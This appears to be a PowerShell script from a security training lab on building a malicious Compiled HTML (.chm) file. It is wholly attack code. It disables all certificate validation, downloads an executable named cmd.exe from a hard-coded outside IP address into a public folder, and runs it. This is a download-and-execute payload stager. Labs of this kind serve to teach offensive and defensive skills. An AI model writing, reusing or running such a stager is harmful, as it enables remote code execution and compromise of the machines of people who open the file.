# Author: Justin Shultz
# ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
# Lab: Write a malicious Compiled HTML File (.chm)

# Trust all SSL certificates (Not recommended for production use)
Add-Type @"
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy {
    public static bool TrustAllCertificateCallback(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) {
        return true;
    }
}
"@
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = [System.Net.Security.RemoteCertificateValidationCallback] { return $true }

# Define the source URL and destination path
$sourceUrl = 'http://9.53.99.47/cmd.exe'
$destinationPath = 'C:\Users\Public\cmd.exe'

# Download the file from the source URL
Invoke-WebRequest -Uri $sourceUrl -OutFile $destinationPath

# Execute the downloaded file
Start-Process -FilePath $destinationPath
